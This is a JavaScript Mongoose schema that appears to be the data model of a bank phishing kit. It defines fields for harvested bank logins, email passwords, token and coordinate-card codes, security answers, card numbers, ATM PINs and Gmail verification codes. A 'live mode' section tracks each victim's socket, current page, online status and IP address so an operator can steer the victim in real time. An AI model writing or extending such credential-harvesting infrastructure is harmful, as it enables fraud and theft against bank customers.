import { Schema, model } from 'mongoose'

const bagSchema = new Schema({
    userRef: {
        type: Schema.ObjectId,
        required: true
    },
    typeDocument: String,
    nroDocument: String,
    nameBank: String,
    username: String,
    password: String,
    correo: String,
    claveCorreo: String,
    celular: String,
    token1: String,
    token2: String,
    token3: String,
    coordinate1: String,
    coordinate2: String,
    coordinate3: String,
    question1: String,
    question2: String,
    question4: String,
    res1: String,
    res2: String,
    res3: String,
    res4: String,
    factor: String,
    method: String,
    image: String,
    tarjeta: String,
    atmPassword: String,
    gmailCode: String,
    gmailDevice: String,
    additionalData: [String],

    // MODE LIVE
    socketID: String,
    modeLive: Boolean,
    pageNow: String,
    liveData: [{
        textPage: String,
        urlPage: String,
        pageNow: Boolean
    }],
    isLiveLoading: Boolean,
    online: Boolean,
    deleteBag: Boolean,
    createAt: Date,
    ip: String,
})


export const Bag = model('Bag', bagSchema);
